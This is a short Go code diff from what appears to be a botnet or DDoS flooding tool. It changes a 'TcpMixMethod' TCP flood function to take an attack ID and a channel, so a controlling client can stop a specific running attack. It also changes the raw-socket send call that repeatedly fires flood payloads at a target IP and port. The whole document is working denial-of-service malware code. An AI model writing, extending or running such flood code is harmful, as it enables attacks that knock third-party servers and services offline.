@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func TcpMixMethod(ctx context.Context, ipaddr string, _port string) {
+func TcpMixMethod(ctx context.Context, ipaddr string, _port string, id int, ch chan int) {
 
 	defer Catch()
 
@@ -34,7 +34,16 @@ func TcpMixMethod(ctx context.Context, ipaddr string, _port string) {
 			if config.DEBUG {
 				fmt.Println("[tcpmix flood] Attack stopped")
 			}
+
 			return
+		case sid := <-ch:
+			if id == sid {
+				if config.DEBUG {
+					fmt.Println("[tcpmix flood] Attack stopped (by client)")
+				}
+				close(ch)
+				return
+			}
 		case <-utils.StopChan:
 			if config.DEBUG {
 				fmt.Println("[tcpmix flood] Cpu balancer")
@@ -77,7 +86,7 @@ func tcpmix(ip net.IP, port int, payload []byte) {
 	syscall.SetNonblock(fd, true)
 
 	for i := 0; i < 20; i++ {
-		syscall.Sendto(fd, payload, 0, &addr)
+		syscall.Sendto(fd, payload, syscall.MSG_NOSIGNAL, &addr)
 		time.Sleep(30 * time.Millisecond)
 	}
 }
